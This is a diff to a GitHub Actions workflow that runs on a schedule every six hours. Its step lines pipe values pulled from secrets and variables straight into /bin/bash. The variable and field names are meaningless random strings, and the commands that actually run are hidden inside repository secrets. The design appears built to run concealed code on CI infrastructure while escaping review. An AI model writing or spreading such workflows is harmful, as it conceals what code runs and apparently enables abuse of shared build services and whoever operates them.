@@ -3,22 +3,26 @@ name: lujingxi3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 1/6 * * *'
+    - cron: '43 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lujingxi3456
         env:
-          m12951: ${{ secrets.m12951 }}
+          aosru9552: ${{ secrets.aosru9552 }}
         run: |
-          echo $m12951 | jq -r .dia9 | /bin/bash
-          echo $xrabo046 | jq -r .ns8933 | /bin/bash
-          echo $ssvw4 | jq -r .dryr4 | /bin/bash
-          echo $j8 | jq -r .rv687 | /bin/bash
-          echo $pkfy5592 | jq -r .ema739 | /bin/bash
-          echo $s45 | jq -r .mz1573 | /bin/bash
-          echo $qppm99497 | jq -r .z352 | /bin/bash
+          echo $aosru9552 | jq -r .dcad79 | /bin/bash
+          echo $fsb20 | jq -r .ohpu1699 | /bin/bash
+          echo $en77 | jq -r .uw2211 | /bin/bash
+          echo $xh20 | jq -r .h3 | /bin/bash
+          echo $abba7052 | jq -r .ox85 | /bin/bash
+          echo $fku3 | jq -r .xc46040 | /bin/bash
+          echo $alz8 | jq -r .vqpb422 | /bin/bash
+          echo $gcg42400 | jq -r .scguc30 | /bin/bash
+          echo $wzk061 | jq -r .ijjyh36 | /bin/bash
+          echo $ae09339 | jq -r .pys8008 | /bin/bash
+          echo $ykal937 | jq -r .iv166 | /bin/bash
 
